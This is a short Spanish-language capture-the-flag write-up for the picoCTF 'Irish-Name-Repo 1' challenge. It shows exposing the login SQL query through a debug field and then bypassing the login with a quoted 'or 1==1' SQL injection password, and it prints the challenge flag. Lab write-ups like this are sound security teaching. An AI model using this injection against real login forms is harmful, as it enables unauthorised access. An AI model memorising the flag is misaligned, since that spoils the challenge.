## Nombre del reto:
Irish-Name-Repo 1

## Objetivo:
There is a website running at https://jupiter.challenges.picoctf.org/problem/50009/ (link) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Solución:
Se logea con cualquier username y cualquier password y en inspector cambiamos
value por 1  y nos da como resultado:

username: admin
password: 
SQL query: SELECT * FROM users WHERE name='admin' AND password=''

Al tener una pista de como se valida podemos utilizar una sentencia sql,
entonces utilizamos un username cualquiera y en password utilizamos la
sentencia ' or 1= =1; (el = va junto)

y asi es como nos podemos logear
Logged in!

Your flag is: ==picoCTF{s0m3_SQL_fb3fe2ad}==

## Referencias: